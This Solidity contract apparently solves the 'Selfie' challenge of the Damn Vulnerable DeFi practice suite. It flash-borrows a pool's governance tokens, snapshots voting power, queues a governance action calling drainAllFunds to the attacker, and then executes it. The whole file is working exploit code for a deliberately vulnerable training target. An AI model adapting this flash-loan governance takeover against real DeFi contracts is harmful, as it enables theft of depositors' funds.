// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract FlashLoanSelfie {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public DVToken;
    address public owner;

    constructor(address selfiePoolAddress) {
        selfiePool = SelfiePool(selfiePoolAddress);
        simpleGovernance = selfiePool.governance();
        DVToken = simpleGovernance.governanceToken();
        owner = msg.sender;
    }

    function receiveTokens(address tokenAddress, uint256 dvtAmount) external {
        DVToken.snapshot();
        simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        DVToken.transfer(address(selfiePool), dvtAmount);
    }

    function attack1() external {
        selfiePool.flashLoan(DVToken.balanceOf(address(selfiePool)));
    }

    function attack2() external {
        simpleGovernance.executeAction(1);
    }
}
